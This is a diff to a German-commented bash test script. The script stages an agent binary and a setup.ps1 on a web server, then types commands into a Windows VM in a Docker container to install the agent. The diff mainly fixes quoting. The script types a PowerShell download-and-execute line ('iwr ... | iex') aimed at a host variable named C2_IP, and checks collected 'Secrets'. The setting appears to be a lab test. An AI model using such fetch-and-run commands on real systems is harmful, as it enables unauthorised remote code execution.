@@ -69,7 +69,10 @@ echo "== 3. Dateien bereitstellen =="
 sudo mkdir -p /srv/kx-www
 sudo cp /srv/kx-win/kx-agent.exe /srv/kx-win/kx-server.pem /srv/kx-win/kx-server-pub.json /srv/kx-www/ 2>/dev/null
 sudo sh -c 'cat /srv/kx-win/kx-token.txt > /srv/kx-www/kx-token.txt; chmod 600 /srv/kx-www/kx-token.txt'
-sudo cp /srv/kx-win/setup.ps1 /srv/kx-www/setup.ps1
+# Die Quelle fuer das Setup-Skript ist der Repo-Checkout: getestet wird das
+# Skript aus dem Repository, nicht eine Kopie daneben.
+REPO="${REPO:-/home/alex/kx-build}"
+sudo cp "$REPO/kx/scripts/kx-vm-setup.ps1" /srv/kx-www/setup.ps1
 sudo chmod a+r /srv/kx-www/setup.ps1 /srv/kx-www/kx-server.pem /srv/kx-www/kx-server-pub.json
 sudo sed -i "s|\\\$basis = \".*\"|\$basis = \"http://$C2_IP:$WWW_PORT\"|" /srv/kx-www/setup.ps1
 sudo sed -i "s|https://[0-9.]*:8443|https://$C2_IP:$C2_PORT|" /srv/kx-www/setup.ps1
@@ -89,14 +92,16 @@ sudo docker cp "$CTL" "$CONTAINER:/tmp/kx-vm-control.sh" 2>/dev/null
 sudo docker exec "$CONTAINER" chmod +x /tmp/kx-vm-control.sh 2>/dev/null
 
 # Die Kommandozeile in der VM oeffnen und den Befehl tippen.
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh tippen 'meta_l-r'" >/dev/null 2>&1
+# Die Argumente laufen als eigene Parameter an `bash -c` — sonst
+# zerstoeren die Anfuehrungszeichen im Befehl das quoting.
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh tippen "meta_l-r"' _ >/dev/null 2>&1
 sleep 2
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh text 'cmd'" >/dev/null 2>&1
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh enter" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ "cmd" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
 sleep 4
 BEFEHL="powershell -c \"iwr http://$C2_IP:$WWW_PORT/setup.ps1 -useb | iex\""
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh text '$BEFEHL'" >/dev/null 2>&1
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh enter" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ "$BEFEHL" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
 echo "   Befehl getippt, warte ${WARTEZEIT}s"
 
 echo "== 5. Warten und pruefen =="
@@ -108,8 +113,8 @@ echo "   Hosts:   $HOSTS"
 echo "   Secrets: $SECRETS"
 
 echo "== 6. Log aus der VM holen =="
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh text 'type C:\\kx\\kx-agent.log'" >/dev/null 2>&1
-sudo docker exec "$CONTAINER" bash -c "/tmp/kx-vm-control.sh enter" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ 'type C:\kx\kx-agent.log' >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
 sleep 3
 sudo docker exec "$CONTAINER" bash -c "printf 'screendump /tmp/kx-vm-ergebnis.ppm\n' | timeout 8 nc -q 1 -U /run/shm/monitor.sock" >/dev/null 2>&1
 sudo docker cp "$CONTAINER:/tmp/kx-vm-ergebnis.ppm" /tmp/kx-vm-ergebnis.ppm >/dev/null 2>&1
